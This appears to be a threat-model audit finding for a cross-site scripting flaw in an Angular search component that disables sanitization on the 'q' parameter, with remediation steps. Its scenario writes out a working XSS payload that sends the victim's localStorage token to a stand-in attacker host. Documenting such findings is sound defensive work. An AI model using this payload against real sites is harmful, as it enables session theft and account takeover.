  stride: Tampering
  cwe: CWE-79
  title: Cross-Site Scripting — search-result.component.ts:143
  affected_parameter: q
  scenario: An attacker crafts a URL such as `/search?q=<img src=x onerror=fetch('https://attacker.example/steal?t='+localStorage.getItem('token'))>`
    and shares it with a victim. When the victim opens the link, `filterTable()` reads `route.snapshot.queryParams.q` and
    passes the raw value to `this.sanitizer.bypassSecurityTrustHtml(queryParam)`. Angular's `DomSanitizer.bypassSecurityTrustHtml`
    explicitly disables all HTML sanitization for the value, so the payload is rendered verbatim in the DOM. The script executes
    in the victim's browser origin, reads the JWT from `localStorage` (`token`), and exfiltrates it to the attacker's server.
  evidence_summary: search-result.component.ts:143 calls `this.sanitizer.bypassSecurityTrustHtml(queryParam)` on the unmodified
    `?q=` URL parameter, defeating Angular's default XSS protection for the search value display.
  impact_description: Attacker gains a full session token for any victim who follows the crafted search URL, enabling complete
    account takeover.
  likelihood: High
  impact: Critical
  risk: Critical
  controls_in_place: Angular template sanitization applies to other bindings but is explicitly disabled for this field via
    bypassSecurityTrustHtml.
  mitigation_title: Remove bypassSecurityTrustHtml from URL query parameter display in search-result.component.ts
  remediation:
    effort: Low
    steps:
    - Remove the `bypassSecurityTrustHtml` call on line 143; assign `queryParam` directly to `this.searchValue` typed as `string`
      (not `SafeHtml`) so Angular's default sanitization applies.
    - Update `search-result.component.html` to bind `searchValue` with `{{ searchValue }}` (text interpolation) rather than
      `[innerHTML]`, eliminating the HTML injection surface entirely.
